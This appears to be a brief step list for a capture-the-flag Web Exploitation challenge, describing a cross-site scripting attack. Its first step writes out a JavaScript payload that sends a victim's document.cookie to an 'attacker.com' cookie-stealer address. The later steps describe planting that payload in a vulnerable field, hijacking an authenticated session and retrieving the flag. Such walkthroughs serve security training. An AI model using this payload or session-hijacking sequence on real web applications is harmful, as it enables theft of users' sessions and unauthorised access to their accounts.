Steps.StepString: Craft malicious JavaScript code to steal a user's session cookie using 'document.location=': 'https://attacker.com/cookie_stealer?cookie='+encodeURIComponent(document.cookie);
Submit the payload as input in the vulnerable field of the web application
A user visits the page and their browser executes the malicious JavaScript code, sending their session cookie to the attacker-controlled domain
Steal the session cookie of an authenticated user and hijack their session to access restricted areas of the web application
Inside one of the restricted areas, uncover the flag for the Web Exploitation challenge
